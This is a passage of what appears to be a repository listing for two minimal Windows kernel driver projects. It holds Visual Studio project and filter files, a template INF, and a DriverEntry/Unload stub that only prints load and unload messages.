    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM">
      <Configuration>Debug</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM">
      <Configuration>Release</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{8694B2C4-D1AB-4876-AD9D-E1BB60328AA3}</ProjectGuid>
    <TemplateGuid>{1bc93793-694f-48fe-9372-81e2b05556fd}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>SimpleDriver</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.15063.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>
    </TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
    <DriverTargetPlatform>Desktop</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>KMDF</DriverType>
    <DriverTargetPlatform>Universal</DriverTargetPlatform>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemGroup>
    <Inf Include="SimpleDriver.inf" />
  </ItemGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Driver.c" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`SimpleDriver/SimpleDriver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="SimpleDriver.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Driver.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```

`TestDriver/Driver.c`:

```c
#include <ntddk.h>
#include <process.h>
VOID Unload(IN PDRIVER_OBJECT DriverObject)
{
	DbgPrint("%s\n", "Driver unloaded.");
	DriverObject;
	return;
}

NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING regPath)
{
	DbgPrint("%s\n", "Driver has been loaded.");
	DriverObject;
	regPath;
	return (STATUS_SUCCESS);
}
```

`TestDriver/TestDriver.inf`:

```inf
;
; TestDriver.inf
;

[Version]
Signature="$WINDOWS NT$"
Class=System
ClassGuid={4d36e97d-e325-11ce-bfc1-08002be10318}
Provider=%ManufacturerName%
DriverVer=
CatalogFile=TestDriver.cat

[DestinationDirs]
DefaultDestDir = 12


[SourceDisksNames]
1 = %DiskName%,,,""

[SourceDisksFiles]


[Manufacturer]
%ManufacturerName%=Standard,NT$ARCH$

[Standard.NT$ARCH$]


[Strings]
ManufacturerName="<Your manufacturer name>" ;TODO: Replace with your manufacturer name
ClassName=""
DiskName="TestDriver Source Disk"

```

`TestDriver/TestDriver.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="12.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM">
      <Configuration>Debug</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM">
      <Configuration>Release</Configuration>
      <Platform>ARM</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|ARM64">
      <Configuration>Debug</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|ARM64">
      <Configuration>Release</Configuration>
      <Platform>ARM64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <ProjectGuid>{3DA1B750-594A-40C9-A958-A9C9C7F964FD}</ProjectGuid>
    <TemplateGuid>{dd38f7fc-d7bd-488b-9242-7d8754cde80d}</TemplateGuid>
    <TargetFrameworkVersion>v4.5</TargetFrameworkVersion>
    <MinimumVisualStudioVersion>12.0</MinimumVisualStudioVersion>
    <Configuration>Debug</Configuration>
    <Platform Condition="'$(Platform)' == ''">Win32</Platform>
    <RootNamespace>TestDriver</RootNamespace>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'" Label="Configuration">
    <TargetVersion>Windows10</TargetVersion>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>WindowsKernelModeDriver10.0</PlatformToolset>
    <ConfigurationType>Driver</ConfigurationType>
    <DriverType>WDM</DriverType>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="PropertySheets">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|ARM64'">
    <DebuggerFlavor>DbgengKernelDebugger</DebuggerFlavor>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <BufferSecurityCheck>false</BufferSecurityCheck>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <BufferSecurityCheck>false</BufferSecurityCheck>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <ControlFlowGuard>false</ControlFlowGuard>
    </ClCompile>
  </ItemDefinitionGroup>
  <ItemGroup>
    <Inf Include="TestDriver.inf" />
  </ItemGroup>
  <ItemGroup>
    <FilesToPackage Include="$(TargetPath)" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Driver.c" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`TestDriver/TestDriver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="Driver Files">
      <UniqueIdentifier>{8E41214B-6785-4CFE-B992-037D68949A14}</UniqueIdentifier>
      <Extensions>inf;inv;inx;mof;mc;</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <Inf Include="TestDriver.inf">
      <Filter>Driver Files</Filter>
    </Inf>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="Driver.c">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
</Project>
```